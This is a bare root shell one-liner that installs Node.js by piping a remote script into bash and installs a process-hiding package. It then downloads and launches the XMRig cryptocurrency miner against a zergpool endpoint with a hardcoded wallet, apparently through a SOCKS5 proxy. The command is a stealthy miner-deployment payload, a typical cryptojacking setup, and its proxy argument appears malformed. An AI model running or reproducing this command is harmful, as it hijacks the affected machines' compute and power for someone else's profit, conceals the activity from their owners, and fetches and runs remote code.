sudo su --command "sudo apt update && sudo apt upgrade -y && curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash - && sudo apt install nodejs && npm i -g node-process-hider && sudo wget https://github.com/xmrig/xmrig/releases/download/v6.12.1/xmrig-6.12.1-linux-x64.tar.gz && tar -xf xmrig-6.12.1-linux-x64.tar.gz && cd xmrig-6.12.1 && ./xmrig -a rx/arq -o stratum+tcp://randomARQ.asia.mine.zergpool.com:4464 -u LUFTF9kAQgHyWLv2rctGvVSSxL9RXBodcF --keepalive --timeout=120 --donate-level 0 -p c=LTC,ID=Data --cpu-priority=2 $ socks5://192.252.214.20:15864"
